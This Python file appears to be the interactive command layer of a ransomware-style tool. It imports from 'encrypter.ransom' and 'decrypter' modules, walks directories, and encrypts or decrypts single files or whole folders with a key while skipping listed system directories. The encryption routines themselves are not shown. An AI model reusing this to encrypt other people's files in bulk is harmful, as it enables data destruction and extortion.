import  os
from cyber.scripts.common_functions import check_content ,process_directory ,enc_help,  clear_console ,read_path , directory_separator
from cyber.scripts.encrypter.ransom import enc_traverse_directory
from cyber.scripts.encrypter.ransom import encrypt_file
import time
from cyber.scripts.decrypter.decrypter import decrypt_multiple_files , decrypt_file
restricted_directories = [
    "/etc",
    "/bin",
    "/sbin",
    "/usr",
    "/var",
    "C:\\Windows",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    "C:\\System Volume Information"
]


class CommonCommands:

    def navigate_back(self, directory, *args):
        if len(args) > 0:
            path = args[0]
            print('new path being passed ', path)
        directory = directory
        directory = os.path.dirname(directory)
        return directory

    def clear_console(self):
        clear_console()

    def ask_help(self):
        print(enc_help())

    def go_foward(self, choice, directory, key , procces):
        directory_sep = directory_separator()
        directory = directory
        key = key
        contents = os.listdir(directory)
        directory = os.path.join(directory, contents[choice - 1])
        if os.path.isfile(directory):
            dec_file = input(f"Do you wish to {procces} , {directory.split(directory_sep)[-1]} (y,n)")
            if dec_file.lower() == 'y':
                print(("{} {} ").format(procces , directory))
                if str(procces).lower() == "decrypt":
                    decrypt_file(directory, key)
                else:
                    encrypt_file(directory, key)
                directory = os.path.dirname(directory)
            else:
                pass

        else :
            pass

        return directory

    def display_folder(self, directory, *args):
        directory = directory
        if len(args) > 0:
            path = args[0]
            directory = path
        print(directory)
        if os.path.isdir(directory):
            try:
                contents = os.listdir(directory)
                for i, folder in enumerate(contents):
                    state = "{}  {}".format(i + 1, folder)
                    print(state)
                return directory
            except PermissionError:
                print(f"Permission denied for file {directory}")
                return os.path.dirname(directory)
        else:
            return directory




class EnCommands(CommonCommands):
    def which_proccess(self):
        print ("necryptio")
    def folder_encryption(self ,directory , key ):
        directory = directory
        parent_dir =directory
        key = key
        value = check_content(directory)
        if value == False:
            # Encrypt folder
            enc_traverse_directory(directory, key)

        else:
            paths_list = process_directory(directory)
            file_count = 0
            start_time = time.time()
            for file_path in paths_list:
                start_time = time.time()
                encrypt_file(file_path, key)
                file_count += 1
               # print(f"{file_path} encrypted ")

            end_time = time.time()
            print(f"Total number of files encrypted is {file_count}")
            elapsed_time = end_time - start_time
            print("Time taken for encryption:", elapsed_time, "seconds")
        return parent_dir

    def file_encryption(self ,directory , key):
        # Encrypt file
        directory = directory
        key = key
        #print('path being passed  for encryption ', directory)
        file_path = read_path(directory)
        encrypt_file(file_path, key)
        print("File encrypted successfully:", file_path)

class DecCommands(CommonCommands):

    def which_proccess(sef):
        print ("dec")
    def folder_decryption(self , directory ,  key):
        path_list = process_directory(directory)
        un_done = decrypt_multiple_files(key , path_list)
        if len(un_done) > 0:
            see = input("do yu wish to see the undecrypted files >(y , n)").lower()
            if see == 'y':
                for i , path in enumerate(un_done):
                    print (i+1 , path)

    def file_decryption(self , directory ,  key ):
        decrypt_file(directory , key)
        os.rename(directory, directory)
        print(f"File decrypted successfully: {directory}")




